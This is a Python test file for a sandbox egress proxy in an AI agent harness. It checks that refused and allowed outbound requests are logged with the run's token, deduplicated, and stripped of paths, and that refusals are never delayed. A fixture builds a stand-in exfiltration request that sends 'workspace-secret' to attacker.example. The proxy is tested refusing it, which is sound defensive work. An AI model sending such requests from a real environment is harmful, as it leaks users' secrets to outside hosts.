"""SEC2 GR-2, GR-3, GR-6 (egress side): the proxy reports a bound sandbox's refusal with its run's own
gateway token, once per reason and host, never the path or query, and never delays the refusal. OB-03: it reports
each destination it let the sandbox reach the same way."""

from __future__ import annotations

import asyncio

import pytest

from harness_core.gateway.refusal_reports import (
    EgressAllowance,
    InMemoryRefusalSink,
    RefusalReport,
    RefusalReporter,
)
from harness_core.sandbox.egress import (
    EgressBinding,
    EgressProxy,
    EgressRefused,
    InMemoryEgressBindings,
    InMemoryTokenSource,
    ProxyRequest,
    StaticResolver,
)
from harness_core.sandbox.types import EgressDestination, EgressPolicy, TokenRoute
from harness_core.testing.clock import ManualClock
from harness_core.testing.ids import SeededIds

SECRET = b"gr-test-secret"
PH = "ph-model-0123456789abcdef"
LABELS = {"orgId": "o1", "sessionId": "s1", "runId": "r1", "attemptId": "a1"}
POLICY = EgressPolicy(
    destinations=(EgressDestination("model-gateway", (8097,)),),
    token_routes=(TokenRoute(PH, "model-gateway", "gateway:model"),),
)
BOUND = EgressBinding("sbx-a", "10.213.0.2", "10.213.0.3", POLICY, LABELS)
REQUEST_POLICY = EgressPolicy(
    destinations=(EgressDestination("model-gateway", (8097,)),),
    token_routes=(TokenRoute("ph-model-request-0123456789", "model-gateway", "gateway:model"),),
)
REQUEST_BOUND = EgressBinding(
    "sbx-r", "10.213.0.6", "10.213.0.7", REQUEST_POLICY, {"orgId": "o1", "sessionId": "s1", "requestId": "req-1"}
)


class HangingSink:
    def __init__(self) -> None:
        self.waiting = 0

    async def record(self, run_id: str, token: str, report: RefusalReport) -> str:
        self.waiting += 1
        await asyncio.Event().wait()
        raise AssertionError("never answers")


async def _proxy(clock: ManualClock, sink: object) -> tuple[EgressProxy, RefusalReporter]:
    bindings = InMemoryEgressBindings()
    await bindings.register(BOUND)
    await bindings.register(REQUEST_BOUND)
    reporter = RefusalReporter(sink)  # pyright: ignore[reportArgumentType]
    proxy = EgressProxy(
        bindings=bindings,
        tokens=InMemoryTokenSource(SECRET, clock, ttl_s=600),
        resolver=StaticResolver(),
        upstreams={"model-gateway": "http://upstream-model:9000/"},
        clock=clock,
        ids=SeededIds(),
        refusals=reporter,
    )
    return proxy, reporter


def _exfil(path: str = "/p?d=workspace-secret") -> ProxyRequest:
    return ProxyRequest("GET", f"http://attacker.example{path}", (("Host", "attacker.example"),), b"")


async def _refuse(proxy: EgressProxy, request: ProxyRequest, local: str = "10.213.0.2", peer: str = "10.213.0.3") -> None:
    with pytest.raises(EgressRefused):
        _ = await proxy.authorize(request, local=local, peer=peer)


async def test_gr2_a_bound_sandbox_refusal_is_reported_with_its_runs_token() -> None:
    clock = ManualClock()
    sink = InMemoryRefusalSink()
    proxy, reporter = await _proxy(clock, sink)
    await _refuse(proxy, _exfil())
    await reporter.drain()
    [record] = sink.records
    assert record.run_id == "r1"
    assert record.token == InMemoryTokenSource.derive(SECRET, "sbx-a", "gateway:model", 0)
    assert record.report == RefusalReport("egress", "destination_not_allowed", 403, host="attacker.example")
    assert "workspace-secret" not in repr(sink.calls)


async def test_gr3_a_flood_of_one_reason_is_one_report() -> None:
    clock = ManualClock()
    sink = InMemoryRefusalSink()
    proxy, reporter = await _proxy(clock, sink)
    for i in range(1000):
        await _refuse(proxy, _exfil(f"/p{i}"))
    await reporter.drain()
    assert len(sink.calls) == 1


async def test_gr4_unbound_sources_and_request_sandboxes_are_not_reported() -> None:
    clock = ManualClock()
    sink = InMemoryRefusalSink()
    proxy, reporter = await _proxy(clock, sink)
    await _refuse(proxy, _exfil(), local="10.213.0.10")
    await _refuse(proxy, _exfil(), local="10.213.0.6", peer="10.213.0.7")
    await reporter.drain()
    assert sink.calls == []


async def test_gr6_a_hanging_sink_never_delays_the_refusal() -> None:
    clock = ManualClock()
    sink = HangingSink()
    proxy, reporter = await _proxy(clock, sink)
    for i in range(50):
        await _refuse(proxy, ProxyRequest("GET", f"http://host{i}.example/", (("Host", f"host{i}.example"),), b""))
    await asyncio.sleep(0)
    assert sink.waiting > 0, "every refusal returned while its report hangs in the sink"
    assert reporter.in_flight <= RefusalReporter.MAX_IN_FLIGHT
    await reporter.close()


def _model_call(path: str = "/v1/chat/completions", placeholder: str = PH) -> ProxyRequest:
    return ProxyRequest(
        "POST",
        f"http://model-gateway:8097{path}",
        (("Host", "model-gateway:8097"), ("Authorization", f"Bearer {placeholder}")),
        b"{}",
    )


async def test_ob03_a_destination_the_proxy_let_through_is_reported_once_with_the_runs_token() -> None:
    """OB-03: every egress decision is on the run's audit record; an allowed destination once per run, host and
    route, however many requests reach it, with no path or query."""
    clock = ManualClock()
    sink = InMemoryRefusalSink()
    proxy, reporter = await _proxy(clock, sink)
    for i in range(100):
        _ = await proxy.authorize(_model_call(f"/v1/chat/completions?n={i}"), local="10.213.0.2", peer="10.213.0.3")
    await _refuse(proxy, _exfil())
    await reporter.drain()
    assert sink.allowances == [("r1", EgressAllowance("model-gateway", "http"))]
    assert [r.report.host for r in sink.records] == ["attacker.example"]
    assert "chat/completions" not in repr(sink.allowances)


async def test_ob03_each_refused_destination_is_reported_not_only_the_first_of_its_reason() -> None:
    clock = ManualClock()
    sink = InMemoryRefusalSink()
    proxy, reporter = await _proxy(clock, sink)
    for host in ("a.example", "b.example", "a.example"):
        await _refuse(proxy, ProxyRequest("GET", f"http://{host}/x", (("Host", host),), b""))
    await reporter.drain()
    assert [r.report.host for r in sink.records] == ["a.example", "b.example"]


async def test_ob03_a_request_sandbox_reports_no_allowed_destination() -> None:
    clock = ManualClock()
    sink = InMemoryRefusalSink()
    proxy, reporter = await _proxy(clock, sink)
    _ = await proxy.authorize(
        _model_call(placeholder="ph-model-request-0123456789"), local="10.213.0.6", peer="10.213.0.7"
    )
    await reporter.drain()
    assert sink.allowances == []
